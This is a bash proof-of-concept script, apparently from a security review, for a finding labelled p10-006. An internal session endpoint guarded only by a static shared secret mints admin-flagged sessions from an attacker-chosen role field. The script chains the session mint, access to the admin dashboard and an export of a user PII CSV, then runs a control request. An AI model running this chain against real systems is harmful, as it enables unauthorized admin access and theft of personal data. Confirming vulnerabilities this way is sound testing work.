#!/usr/bin/env bash
# PoC for p10-006: /api/internal/site-session is reachable on the public route table
# with only a single static shared secret (X-Admin-Secret), and mints sessions whose
# customer row carries role:'admin' projection — full access to every /api/admin/* route.
#
# Chain:
#   1. POST {{BASE_URL}}/api/internal/site-session with X-Admin-Secret + body
#      {"email": attacker, "role": "admin"} -> 200 + live session token.
#      syncCustomerRole writes customers.admin = 1 from the attacker-chosen body field
#      (site-session.ts). No transport/binding/IP/rate controls on the path.
#   2. GET {{BASE_URL}}/api/admin/dashboard with Authorization: Bearer [REDACTED:bearer] token>
#      -> 200 (requireAdminSession passes because customers.admin = 1).
#   3. GET {{BASE_URL}}/api/admin/export/users -> admin PII CSV export.
#   Control: same mint request WITHOUT X-Admin-Secret -> 401 fail-closed.
#
# Target: {{BASE_URL}} (filled at confirm time; defaults to local wrangler dev)
# Secret: [REDACTED:secret] env var (the single static shared secret; set by setup.sh)
set -u
BASE="${1:-}"
case "$BASE" in ''|*'{{'*) BASE="http://127.0.0.1:8799";; esac
SECRET="${ADMIN_API_SECRET:-poc-admin-secret-3f9a1c}"
ATTACKER="attacker-poc-$(date +%s)@evil.test"

echo "[*] Step 1: mint an admin-flagged session from an external-style request"
echo "    POST $BASE/api/internal/site-session (public hostname form, no binding context)"
mint=$(curl -s -w "\n%{http_code}" "$BASE/api/internal/site-session" \
  -X POST -H 'content-type: application/json' -H "X-Admin-Secret: $SECRET" \
  -d "{\"email\":\"$ATTACKER\",\"name\":\"attacker\",\"betterAuthUserId\":\"not-checked\",\"role\":\"admin\"}")
code=$(echo "$mint" | tail -1)
body=$(echo "$mint" | head -n -1)
echo "    -> HTTP $code: $body"
token=$(echo "$body" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
[ -z "$token" ] && { echo '{"status":"failed","evidence":"no session token minted","notes":"HTTP '"$code"'"}'; exit 1; }

echo "[*] Step 2: use minted token against admin-only surface"
admin=$(curl -s -m 10 -w "\n%{http_code}" "$BASE/api/admin/dashboard" \
  -H "Authorization: Bearer [REDACTED:bearer]")
admin_code=$(echo "$admin" | tail -1)
echo "    GET /api/admin/dashboard -> HTTP $admin_code"

echo "[*] Step 3: exfiltrate PII via admin CSV export"
exported=$(curl -s -m 15 -w "\n%{http_code}" "$BASE/api/admin/export/users" \
  -H "Authorization: Bearer [REDACTED:bearer]")
exp_code=$(echo "$exported" | tail -1)
exp_body=$(echo "$exported" | head -n -1)
echo "    GET /api/admin/export/users -> HTTP $exp_code, $(echo -n "$exp_body" | wc -c) bytes"
echo "$exp_body" | head -3

echo "[*] Control: same request WITHOUT the secret must fail closed"
ctrl=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/api/internal/site-session" \
  -X POST -H 'content-type: application/json' \
  -d "{\"email\":\"$ATTACKER\",\"role\":\"admin\"}")
echo "    no-secret mint -> HTTP $ctrl"

if [ "$code" = "200" ] && [ -n "$token" ] && [ "$admin_code" = "200" ] && [ "$exp_code" = "200" ]; then
  echo '{"status":"confirmed","evidence":"session token minted via public-form POST to /api/internal/site-session with only the static X-Admin-Secret; token grants HTTP 200 on /api/admin/dashboard and retrieves /api/admin/export/users PII export (customers.admin=1 written from attacker-controlled role field)","notes":"control: identical request without secret -> '"$ctrl"' (401 fail-closed); exposure topology, not comparison weakness"}'
else
  echo '{"status":"failed","evidence":"mint='"$code"' admin='"$admin_code"' export='"$exp_code"'","notes":""}'
fi
